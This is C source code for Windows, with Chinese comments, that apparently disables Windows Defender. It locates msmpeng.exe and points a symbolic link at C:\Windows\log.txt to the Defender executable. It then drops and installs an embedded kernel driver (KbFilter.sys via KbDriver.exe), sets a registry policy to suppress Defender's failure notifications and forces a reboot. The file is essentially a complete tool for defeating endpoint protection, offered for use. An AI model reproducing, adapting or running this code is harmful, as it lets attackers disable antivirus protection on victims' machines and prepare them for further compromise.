#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <stdio.h>
#include <direct.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include "resource.h"

// 定义 NtQueryInformationProcess 原型
typedef NTSTATUS(WINAPI* PNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength);

// 获取进程 ID
DWORD GetProcessIdByName(const char* processName) {
    DWORD processId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, processName) == 0) {
                processId = pe.th32ProcessID;
                CloseHandle(hSnapshot);
                return processId;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return 0;
}

// 转换 NT 设备路径为 Win32 路径
BOOL ConvertNtPathToWin32Path(const char* ntPath, char* win32Path, DWORD size) {
    HANDLE hFile = CreateFileA(ntPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("无法打开文件句柄，错误代码: %d\n", GetLastError());
        return FALSE;
    }

    DWORD len = GetFinalPathNameByHandleA(hFile, win32Path, size, FILE_NAME_NORMALIZED);
    CloseHandle(hFile);

    if (len == 0 || len >= size) {
        printf("GetFinalPathNameByHandleA 失败, 错误代码: %d\n", GetLastError());
        return FALSE;
    }

    // 移除 "\\?\" 前缀
    if (strncmp(win32Path, "\\\\?\\", 4) == 0) {
        memmove(win32Path, win32Path + 4, len - 3);
    }

    return TRUE;
}

BOOL GetProcessPath(DWORD processId, char* win32Path, DWORD size) {
    BOOL result = FALSE;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
    if (!hProcess) {
        printf("OpenProcess 失败, 错误代码: %d\n", GetLastError());
        return FALSE;
    }

    DWORD len = size;
    if (QueryFullProcessImageNameA(hProcess, 0, win32Path, &len)) {
        result = TRUE;
    }
    else {
        printf("QueryFullProcessImageNameA 失败, 错误代码: %d\n", GetLastError());
    }

    CloseHandle(hProcess);
    return result;
}


// 创建符号链接
BOOL CreateSymlink(const char* symlink, const char* target) {
    return CreateSymbolicLinkA(symlink, target, 0);
}

typedef long NTSTATUS;

typedef enum _SHUTDOWN_ACTION
{
    ShutdownNoReboot,
    ShutdownReboot,
    ShutdownPowerOff
} SHUTDOWN_ACTION, * PSHUTDOWN_ACTION;

typedef NTSTATUS(NTAPI* NTSHUTDOWNSYSTEM)(SHUTDOWN_ACTION);

void reboot()
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    printf("正在获取必要权限\n");

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("OpenProcessToken failed. Error: %lu\n", GetLastError());
    }


    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tp.Privileges[0].Luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;


    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        printf("AdjustTokenPrivileges failed. Error: %lu\n", GetLastError());
        CloseHandle(hToken);
    }

    printf("SE_SHUTDOWN_NAME privilege granted successfully.\n");
    CloseHandle(hToken);
    HMODULE hModule = GetModuleHandleW(L"ntdll.dll");
    if (hModule) {
        auto proc = (NTSHUTDOWNSYSTEM)GetProcAddress(hModule, "NtShutdownSystem");
        if (proc) {
            proc(ShutdownReboot);
        }
    }
}

BOOL getsys()
{
    // 定位我们的自定义资源
    HMODULE hModule = GetModuleHandle(NULL);
    if (hModule == NULL)
    {
        return FALSE;
    }

    HRSRC hRsrc = FindResource(hModule, MAKEINTRESOURCE(IDR_SYS1), TEXT("SYS"));
    if (hRsrc == NULL)
    {
        return FALSE;
    }

    // 获取资源大小
    DWORD dwSize = SizeofResource(hModule, hRsrc);
    if (dwSize == 0)
    {
        return FALSE;
    }

    // 加载资源
    HGLOBAL hGlobal = LoadResource(hModule, hRsrc);
    if (hGlobal == NULL)
    {
        return FALSE;
    }

    // 锁定资源
    LPVOID lpVoid = LockResource(hGlobal);
    if (lpVoid == NULL)
    {
        FreeResource(hGlobal);  // 在返回前释放资源
        return FALSE;
    }

    // 将资源写入文件
    FILE* fp = fopen("KbFilter.sys", "wb+");
    if (fp == NULL)
    {
        FreeResource(hGlobal);
        return FALSE;
    }

    fwrite(lpVoid, sizeof(char), dwSize, fp);
    fclose(fp);

    // 释放资源
    FreeResource(hGlobal);
    return TRUE;
}

BOOL getinstaller()
{
    // 定位我们的自定义资源
    HMODULE hModule = GetModuleHandle(NULL);
    if (hModule == NULL)
    {
        return FALSE;
    }

    HRSRC hRsrc = FindResource(hModule, MAKEINTRESOURCE(IDR_INSTALL1), TEXT("INSTALL"));
    if (hRsrc == NULL)
    {
        return FALSE;
    }

    // 获取资源大小
    DWORD dwSize = SizeofResource(hModule, hRsrc);
    if (dwSize == 0)
    {
        return FALSE;
    }

    // 加载资源
    HGLOBAL hGlobal = LoadResource(hModule, hRsrc);
    if (hGlobal == NULL)
    {
        return FALSE;
    }

    // 锁定资源
    LPVOID lpVoid = LockResource(hGlobal);
    if (lpVoid == NULL)
    {
        FreeResource(hGlobal);  // 在返回前释放资源
        return FALSE;
    }

    // 将资源写入文件
    FILE* fp = fopen("KbDriver.exe", "wb+");
    if (fp == NULL)
    {
        FreeResource(hGlobal);
        return FALSE;
    }

    fwrite(lpVoid, sizeof(char), dwSize, fp);
    fclose(fp);

    // 释放资源
    FreeResource(hGlobal);
    return TRUE;
}

int main() {
    printf("Made by phtcloud_dev\n");
    const char* targetProcess = "msmpeng.exe"; //HipsDaemon
    const char* symlinkPath = "C:\\Windows\\log.txt";
    char processPath[MAX_PATH] = { 0 };

    DWORD pid = GetProcessIdByName(targetProcess);
    if (pid == 0) {
        printf("未找到进程 %s\n", targetProcess);
        return 1;
    }

    printf("进程 %s 的 PID: %d\n", targetProcess, pid);

    if (!GetProcessPath(pid, processPath, MAX_PATH)) {
        printf("无法获取进程 %s 的路径\n", targetProcess);
        return 1;
    }

    printf("路径: %s\n", processPath);

    if (CreateSymlink(symlinkPath, processPath)) {
        const char* new_dir = "C:\\Windows\\Temp";
        _chdir(new_dir);
       // printf("符号链接创建成功: %s -> %s\n", symlinkPath, processPath);
        if (getsys() && getinstaller()) {
            system("KbDriver.exe /install");
            HKEY hKey;
            LPCSTR subKey = "SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications";
            DWORD value = 1;

            // 尝试打开或创建注册表键
            LONG result = RegCreateKeyExA(
                HKEY_LOCAL_MACHINE,
                subKey,
                0,
                NULL,
                REG_OPTION_NON_VOLATILE,
                KEY_WRITE,
                NULL,
                &hKey,
                NULL
            );

            if (result == ERROR_SUCCESS) {
                // 设置 DisableNotifications 值为 1 这里可以关闭启动失败的通知
                result = RegSetValueExA(hKey, "DisableNotifications", 0, REG_DWORD, (const BYTE*)&value, sizeof(value));
                RegCloseKey(hKey);

                if (result == ERROR_SUCCESS) {
                    printf("注册表修改成功！\n");
                }
                else {
                    printf("无法设置注册表值，错误代码: %ld\n", result);
                }
            }
            else {
                printf("无法打开或创建注册表键，错误代码: %ld\n", result);
            }
            reboot();
        }
        else{
            printf("资源释放失败\n");
        }
    }
    else {
        printf("错误代码: %d\n", GetLastError());
    }

    return 0;
}
